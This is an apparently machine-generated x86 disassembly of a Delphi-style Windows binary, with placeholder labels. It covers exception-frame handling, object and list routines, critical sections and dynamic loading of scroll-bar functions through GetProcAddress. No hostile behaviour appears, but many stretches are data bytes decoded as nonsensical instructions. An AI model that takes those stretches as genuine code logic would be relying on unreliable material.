push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42be1f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0xb1347265
inc edx
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
inc eax
outsb
je r-xdata
inc edx
outsb
dec eax
insb
lodsd [ esi ]
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x42b138c0 ]
add [ edi ] cl
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403fc0
imul ebp [ edi + 0x6e ] 0x9800408d
mov dl 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x42b2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0xc0042b2 ] ch
add [ eax ] al
add [ eax ] cl
adc [ eax ] eax
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
jae r-xdata
outsb
je r-xdata
jo r-xdata
cmp cl [ ecx ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
jmp r-xdata
lea eax [ eax ]
xor al 0xb2
inc edx
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp - 0x4dcbffc0 ]
jns r-xdata
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42be26
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a20
lea eax [ ebp - 0x8 ]
call sub_40599c
retn
inc ebx
xor edi edi
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
lodsd [ esi ]
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4059e0
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
outsd
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b080
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42a5f0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4059b4
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4059e0
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
jae r-xdata
dec [ ebx + 0x42b0c8c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
sub_42b343
aad 0xb2
inc edx
add bh bl
mov dl 0x42
add cl ch
mov dl 0x42
add [ ebp - 0x3affbd4e ] bh
mov dl 0x42
add ch cl
mov dl 0x42
add [ ebx ] ah
mov bl 0x42
add [ 0x370042b3 ] ch
std
dec esp
int3
cmp al [ ebx - 0x4d ]
inc edx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0x6d ] dl
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
mov bl 0x42
add bl dh
mov dl 0x42
add bl bh
mov dl 0x42
add [ ebx ] al
mov bl 0x42
add [ ebx ] cl
mov bl 0x42
add [ ebx ] dl
mov bl 0x42
add [ ebx ] bl
mov bl 0x42
add [ edx ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
and esi [ ebx - 0x4cd2ffbe ]
inc edx
add [ edi ] dh
cmp bl [ ebx - 0x4d ]
inc edx
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
or [ edx + eax * 2 + 0x42b37f00 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] cl
mov ah 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
mov ah 0x42
add [ eax ] dh
add [ eax ] al
add [ edx + edx ] ch
inc eax
add [ esp + esi + 0x40 ] ah
add [ edx + ebx * 2 ] bl
inc eax
add [ eax ] ch
pop edx
inc eax
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax ] bh
pop edx
inc eax
add al dl
xor [ eax ] eax
call 0xe42f6c8
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + esi * 4 + 0xc0042 ] cl
add [ eax ] al
int3
sub_42b450
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_42b4c6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_42b5dc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4059b4
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b4cd
lea eax [ ebp - 0x8 ]
call sub_40599c
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b568
mov [ rw-data ] eax
sub_42b4d4
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b568
mov [ rw-data ] eax
mov ecx r-xdata
call sub_4059e0
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_42b52c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4059b4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_42b568
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a5b4
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a5b4
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a5b4
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403f6c
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_42b5dc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42b6dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b52c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42a604
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_40599c
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d3bc
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_40599c
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d3bc
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b52c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42a604
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b52c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42a604
mov ecx r-xdata
call sub_4059e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b6e4
lea eax [ ebp - 0xc ]
call sub_40599c
lea eax [ ebp - 0x8 ]
call sub_40599c
retn
sub edx 0xfffffff8
sub_42b6fc
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_42a5f0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42b73c
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_42a5f0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42b76c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42b8fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_42a5f0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b899
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b905
lea eax [ ebp - 0x10 ]
call sub_403f6c
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42a5f0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
mov eax esi
xor edx edx
call sub_42a5f0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42a5f0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40321c
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_42a5f0
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_42b90c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42b9f1
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_403fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b9f8
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a20
lea eax [ ebp - 0x8 ]
call sub_40599c
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42a5f0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4059b4
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4059e0
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42a5f0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4059b4
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4059e0
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_42bc28
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42bd1b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_403fc0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bd22
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a20
lea eax [ ebp - 0x10 ]
call sub_40599c
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4059e0
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_42a5f0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_4059b4
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4059e0
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_42bd40
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42be1f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403fc0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42be26
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a20
lea eax [ ebp - 0x8 ]
call sub_40599c
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4059e0
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42a5f0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4059b4
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4059e0
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42be40
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405a10
xor eax eax
push ebp
push sub_42be8f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4059b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42be96
lea eax [ ebx + 0xc ]
call sub_40599c
sub_42be9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40441c
xor eax eax
push ebp
push sub_42bf31
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_403fc0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42bc28
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bf38
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax ebx
call sub_42b73c
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42b76c
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42b90c
sub_42bf5c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_42a5f0
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_42a5f0
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_41a08c
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_42a5f0
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_41a08c
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_41a08c
sub_42bfe8
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_42b6fc
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_40321c
mov eax [ esi + 0x14 ]
call sub_40321c
mov eax [ esi + 0x10 ]
call sub_40321c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40599c
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_42c03c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c073
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c07a
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_42c084
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c0a9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c0b0
retn
sub_42c0bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c0ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c0f4
retn
mov eax [ rw-data ]
call sub_40321c
sub_42c100
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42c134
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42c15c
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_42c3de
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c405
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c40c
retn
sub_42c471
les eax [ edx ]
push cs
push esp
push ebx
jns r-xdata
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x30 ] si
les eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fadd st4
inc edx
add [ eax + eax ] bl
add [ eax ] al
and ah al
inc edx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax * 8 - 0x3a9bffbe ] dh
inc edx
add [ eax - 0x3b ] dh
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
sub_42c4f4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031ec
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_42c534
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_42c58c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c5b1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c5b8
retn
sub_42c5c4
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42c57c
xor eax eax
push ebp
push sub_42c77b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c782
mov eax [ rw-data ]
call sub_42c584
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
